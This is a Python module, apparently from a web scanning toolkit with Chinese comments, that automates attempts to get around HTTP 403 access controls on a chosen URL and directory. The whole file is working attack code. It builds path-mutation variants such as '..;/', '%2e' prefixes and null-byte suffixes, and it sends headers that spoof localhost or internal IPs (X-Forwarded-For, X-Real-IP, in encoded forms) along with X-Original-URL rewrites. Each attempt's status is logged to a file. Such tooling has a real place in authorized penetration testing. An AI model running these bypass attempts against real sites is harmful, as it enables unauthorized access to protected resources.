# config/webscan/bypass403.py
import requests
import os
import tldextract
from colorama import init, Fore, Style
from pyfiglet import Figlet
from validators import url as validate_url  # 复用项目已有的validators库

# 初始化colorama（保持与主程序风格一致）
init(autoreset=True)




class PathRepository:
    """生成用于绕过403的路径变体（原逻辑保留）"""

    def __init__(self, path):
        self.path = path
        self.newPaths = []  # 路径变体列表
        self.newHeaders = []  # 伪造Header列表（IP授权类）
        self.rewriteHeaders = []  # 路径重写Header列表（X-Original-URL等）

        self.create_new_paths()
        self.create_new_headers()

    def create_new_paths(self):
        """生成路径变体（如//admin、/admin/..;/等）"""
        self.newPaths.append(self.path)

        # 路径分隔符替换/重复
        pairs = [["/", "//"], ["/.", "/./"]]
        for pair in pairs:
            self.newPaths.append(pair[0] + self.path + pair[1])

        # 前缀篡改（%2e编码）
        leadings = ["/%2e"]
        for leading in leadings:
            self.newPaths.append(leading + self.path)

        # 后缀篡改（加特殊字符/参数）
        trailings = [
            "/", "..;/", "/..;/", "%20", "%09", "%00",
            ".json", ".css", ".html", "?", "??", "???",
            "?testparam", "#", "#test", "/."
        ]
        for trailing in trailings:
            self.newPaths.append(self.path + trailing)

    def create_new_headers(self):
        """生成伪造Header（IP授权、路径重写）"""
        # 1. IP授权类Header（伪造本地/内网IP）
        ip_headers = [
            "X-Custom-IP-Authorization", "X-Forwarded-For",
            "X-Forward-For", "X-Remote-IP", "X-Originating-IP",
            "X-Remote-Addr", "X-Client-IP", "X-Real-IP"
        ]
        ip_values = [
            "localhost", "localhost:80", "localhost:443",
            "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443",
            "2130706433", "0x7F000001", "0177.0000.0000.0001",
            "0", "127.1", "10.0.0.0", "10.0.0.1",
            "172.16.0.0", "172.16.0.1", "192.168.1.0", "192.168.1.1"
        ]
        for header in ip_headers:
            for value in ip_values:
                self.newHeaders.append({header: value})

        # 2. 路径重写类Header（直接指定目标路径）
        rewrite_headers = ["X-Original-URL", "X-Rewrite-URL"]
        for header in rewrite_headers:
            self.rewriteHeaders.append({header: self.path})


class Query:
    """发送绕过请求并处理响应（适配主程序args参数，支持输出路径）"""

    def __init__(self, args, url, dir_path):
        self.args = args  # 主程序传入的参数（含输出路径、调试模式等）
        self.url = url.strip().rstrip("/")  # 确保URL无末尾斜杠
        self.dir_path = dir_path  # 目标目录（如/admin）
        self.domain = tldextract.extract(self.url).domain  # 提取域名用于输出文件名
        self.path_obj = PathRepository(self.dir_path)  # 生成路径变体
        self.output_file = self._get_output_file()  # 输出文件路径（复用主程序输出目录）

    def _get_output_file(self):
        """生成输出文件路径（优先用主程序--output参数，否则默认在当前目录）"""
        if self.args.output:
            # 若主程序指定输出路径，在该路径下创建403绕过结果文件
            output_dir = os.path.dirname(self.args.output)
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            return os.path.join(output_dir, f"{self.domain}_403bypass.txt")
        else:
            # 默认输出到当前目录
            return f"{self.domain}_403bypass.txt"

    def _get_status_color(self, status_code):
        """根据状态码返回颜色（与主程序风格统一）"""
        if status_code in [200, 201]:
            return Fore.GREEN + Style.BRIGHT
        elif status_code in [301, 302]:
            return Fore.BLUE + Style.BRIGHT
        elif status_code in [403, 404]:
            return Fore.MAGENTA + Style.BRIGHT
        elif status_code == 500:
            return Fore.RED + Style.BRIGHT
        else:
            return Fore.WHITE + Style.BRIGHT

    def _write_result(self, content):
        """写入结果到文件（追加模式）"""
        with open(self.output_file, "a", encoding="utf-8") as f:
            f.write(content + "\n")

    def send_requests(self):
        """发送所有绕过请求（POST基础请求 + 路径变体 + Header伪造）"""
        print(Fore.CYAN + f"\n[+] 开始403绕过检测 | 目标URL: {self.url} | 目标目录: {self.dir_path}")
        print(Fore.CYAN + f"[+] 结果将保存至: {self.output_file}\n" + Style.RESET_ALL)

        # 1. 基础POST请求（原逻辑保留）
        try:
            resp = requests.post(f"{self.url}{self.dir_path}", timeout=10)
            color = self._get_status_color(resp.status_code)
            log = f"POST --> {self.url}{self.dir_path} | 状态码: {color}{resp.status_code} | 响应大小: {len(resp.content)} bytes"
            print(log)
            self._write_result(log.replace(Style.BRIGHT, "").replace(color, ""))  # 写入文件时移除颜色码
        except Exception as e:
            err_log = f"POST --> {self.url}{self.dir_path} | 请求失败: {str(e)}"
            print(Fore.RED + err_log)
            self._write_result(err_log)

        # 2. 路径变体请求（GET）
        print(Fore.CYAN + "\n[+] 开始测试路径变体...")
        for path in self.path_obj.newPaths:
            try:
                resp = requests.get(f"{self.url}{path}", timeout=10)
                color = self._get_status_color(resp.status_code)
                log = f"GET (路径变体) --> {self.url}{path} | 状态码: {color}{resp.status_code} | 响应大小: {len(resp.content)} bytes"
                print(log)
                self._write_result(log.replace(Style.BRIGHT, "").replace(color, ""))
            except Exception as e:
                err_log = f"GET (路径变体) --> {self.url}{path} | 请求失败: {str(e)}"
                print(Fore.RED + err_log)
                self._write_result(err_log)

        # 3. 伪造IP授权Header请求
        print(Fore.CYAN + "\n[+] 开始测试IP授权Header...")
        for header in self.path_obj.newHeaders:
            try:
                resp = requests.get(f"{self.url}{self.dir_path}", headers=header, timeout=10)
                color = self._get_status_color(resp.status_code)
                log = f"GET (伪造Header) --> {self.url}{self.dir_path} | Header: {header} | 状态码: {color}{resp.status_code} | 响应大小: {len(resp.content)} bytes"
                print(log)
                self._write_result(log.replace(Style.BRIGHT, "").replace(color, ""))
            except Exception as e:
                err_log = f"GET (伪造Header) --> {self.url}{self.dir_path} | Header: {header} | 请求失败: {str(e)}"
                print(Fore.RED + err_log)
                self._write_result(err_log)

        # 4. 路径重写Header请求（直接通过Header指定路径）
        print(Fore.CYAN + "\n[+] 开始测试路径重写Header...")
        for header in self.path_obj.rewriteHeaders:
            try:
                resp = requests.get(self.url, headers=header, timeout=10)
                color = self._get_status_color(resp.status_code)
                log = f"GET (路径重写) --> {self.url} | Header: {header} | 状态码: {color}{resp.status_code} | 响应大小: {len(resp.content)} bytes"
                print(log)
                self._write_result(log.replace(Style.BRIGHT, "").replace(color, ""))
            except Exception as e:
                err_log = f"GET (路径重写) --> {self.url} | Header: {header} | 请求失败: {str(e)}"
                print(Fore.RED + err_log)
                self._write_result(err_log)

        print(Fore.GREEN + f"\n[+] 403绕过检测完成！所有结果已保存至: {self.output_file}")


def run_403bypass(args):

    # 1. 验证URL合法性（复用主程序逻辑）
    if not validate_url(args.url):
        print(Fore.RED + f"[!] 无效URL: {args.url}（需带http://或https://）")
        return

    # 2. 获取目标目录（支持用户输入或默认根目录）
    while True:
        dir_input = input(Fore.CYAN + "请输入目标目录（如/admin，默认/）: ").strip() or "/"
        if not dir_input.startswith("/"):
            dir_input = "/" + dir_input  # 确保目录以/开头
        # 可选：支持从文件读取多个目录（扩展功能）
        if dir_input.lower().endswith(".txt") and os.path.exists(dir_input):
            with open(dir_input, "r", encoding="utf-8") as f:
                dir_list = [d.strip() for d in f.readlines() if d.strip()]
            break
        else:
            dir_list = [dir_input]
            break

    # 3. 对每个目录执行403绕过检测
    for dir_path in dir_list:
        query = Query(args, args.url, dir_path)
        query.send_requests()
        print(Fore.CYAN + "=" * 80 + Style.RESET_ALL)